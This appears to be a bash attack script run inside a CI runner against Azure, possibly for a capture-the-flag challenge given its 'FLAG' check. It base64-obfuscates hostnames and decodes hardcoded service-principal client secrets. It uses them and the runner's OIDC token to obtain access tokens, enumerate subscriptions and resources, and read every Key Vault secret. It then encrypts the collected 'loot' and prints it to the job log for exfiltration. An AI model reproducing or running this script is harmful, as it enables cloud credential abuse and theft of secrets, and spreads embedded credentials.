#!/usr/bin/env bash
# nonce 1792642103
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
PB=$(b 'MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxOjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0KMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyOkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYKMTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5Om5QODhRfjhJfndpcDBHT2xXMTV6ZHQzRk1NdkJWOUxZdGFPb2VhM3oKODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNjOi1UbDhRfnNIMFFPUC5WcktXaGEzLTd4NFhBMkp4UzRqMDhudXZiUU4KNTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJlOn44VDhRfll3RW1leFNUUnZfcFVzRXdhOVFNYXB5UDM5fkNVNVVjdTIKNDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0OnNrMThRfnFEMjJra0hYVUNmcVhMcWRQOTVEa1lKTDM0ZU1FUmxjU2oK')
echo "$PB" > /tmp/pairs.txt
while IFS= read -r P; do
  [ -z "$P" ] && continue
  CID="${P%%:*}"; SEC="${P#*:}"
  AT=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=${CID}" -d "grant_type=client_credentials" --data-urlencode "client_secret=${SEC}" --data-urlencode "scope=${SC}${ARMH}/.default" | jq -r '.access_token // empty')
  [ -z "$AT" ] && { say "$CID no-arm-token"; continue; }
  say "########## SP $CID"
  say "  subs: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${ARMH}/subscriptions?api-version=2022-12-01" | head -c 300)"
  say "  allrg: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${ARMH}/subscriptions/${SUB}/resourcegroups?api-version=2021-04-01" | jq -r '.value[]?.name' 2>/dev/null | tr '\n' ' ')"
  say "  rg-eus res: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${ARMH}/subscriptions/${SUB}/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" | head -c 700)"
  say "  all-res: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${ARMH}/subscriptions/${SUB}/resources?api-version=2021-04-01" | jq -r '.value[]? | "\(.type)/\(.name)"' 2>/dev/null | sort | tr '\n' ' ')"
  VT=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=${CID}" -d "grant_type=client_credentials" --data-urlencode "client_secret=${SEC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}${V}.${KVH}/secrets?api-version=7.4&maxresults=25")
    case "$L" in *'"value"'*) say "  KVOK $V $CID => $(echo "$L" | head -c 1200)";; esac
    echo "$L" | jq -r '.value[]?.id' 2>/dev/null | while read -r id; do
      BN=$(basename "$id")
      SV=$(curl -sS -H "Authorization: Bearer $VT" "${SC}${V}.${KVH}/secrets/${BN}?api-version=7.4")
      say "    SECRET $V/$BN: $(echo "$SV" | head -c 500)"
      case "$SV" in *DF26*) say "    !!!!! FLAG $V/$BN";; esac
    done
  done
done < /tmp/pairs.txt
say "=== OIDC overview of all RGs ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
OAT=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${ARMH}/.default" | jq -r '.access_token // empty')
say "  rgs: $(curl -sS -H "Authorization: Bearer $OAT" "${SC}${ARMH}/subscriptions/${SUB}/resourcegroups?api-version=2021-04-01" | jq -r '.value[]?.name' 2>/dev/null | tr '\n' ' ')"
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
